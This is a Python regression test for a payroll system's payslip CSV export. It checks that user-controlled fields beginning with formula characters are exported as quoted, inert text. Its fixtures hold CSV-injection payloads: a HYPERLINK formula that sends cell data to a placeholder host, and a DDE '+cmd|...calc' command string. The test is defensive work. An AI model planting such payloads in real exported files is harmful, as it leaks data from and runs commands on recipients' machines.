"""R2-407 - the payslip CSV export must not emit executable formulas.

The backend payslip export wrote employee name / designation / pay period /
company / project (all user-controlled strings) straight into cells, so a
staff member named `=HYPERLINK("http://x/?"&A1,"click")` executed in the
recipient's spreadsheet the moment the payroll attachment was opened. The DPR
(R2-266) and BOCW (R2-185) exports were already neutralised; this closes the
last spreadsheet-facing exporter.

Gate: any cell whose value begins with = + - @ TAB or CR is exported with a
leading single quote (forced text), benign values pass through untouched, and
numeric salary columns are never quoted.
"""
import csv
import io
import uuid

from app import models

_SUFFIX = uuid.uuid4().hex[:8]


def test_r2_407_payslip_export_neutralizes_formula_cells(client, db, make_tenant, auth_headers):
    comp, user, team = make_tenant(
        company_name=f"=R2407 Co {_SUFFIX}", user_name="U2407",
        mobile=f"+9193{_SUFFIX}", email=f"r2407-{_SUFFIX}@test.com",
    )
    hdr = auth_headers(user, comp)
    project = models.Project(
        id=uuid.uuid4(), company_id=comp.id, name="+cmd project", code=f"PRJ-2407-{_SUFFIX}", status="Ongoing",
    )
    emp = models.StaffEmployee(
        id=uuid.uuid4(), company_id=comp.id, project_id=project.id,
        name='=HYPERLINK("https://zz.example/?d="&A1,"ZZ CLICK")',
        employee_code=None,
        designation="+cmd|'/c calc'!A1",
    )
    run = models.PayrollRun(id=uuid.uuid4(), company_id=comp.id, project_id=project.id, payroll_month="@2607-07")
    line = models.PayrollLineItem(
        id=uuid.uuid4(), payroll_run_id=run.id, employee_id=emp.id,
        days_present=26.0, days_in_month=26,
        gross_salary=23400.0, net_payable=21240.0,
    )
    db.add_all([project, emp, run, line])
    db.commit()

    r = client.get(f"/apis/v3/hr/payroll/{run.id}/payslips/export", headers=hdr)
    assert r.status_code == 200, r.text
    assert "text/csv" in r.headers.get("content-type", ""), r.headers

    rows = list(csv.reader(io.StringIO(r.content.decode("utf-8-sig"))))
    data = [row for row in rows[1:] if row]
    assert len(data) == 1, r.text
    row = data[0]

    # The formula payloads are stored and exported as inert text.
    assert row[1] == "'=HYPERLINK(\"https://zz.example/?d=\"&A1,\"ZZ CLICK\")", row
    assert row[2] == "'+cmd|'/c calc'!A1", row
    assert row[15] == "'@2607-07", row
    assert row[17] == f"'=R2407 Co {_SUFFIX}", row
    assert row[18] == "'+cmd project", row

    # Numbers stay numbers: no quote prefix on salary figures.
    assert float(row[5]) == 23400.0, row
    assert float(row[14]) == 21240.0, row

    # No raw line in the file may start with a formula character.
    body_lines = [ln for ln in r.content.decode("utf-8-sig").splitlines()[1:] if ln]
    assert all(not ln.startswith(("=", "+", "-", "@")) for ln in body_lines), body_lines[:3]
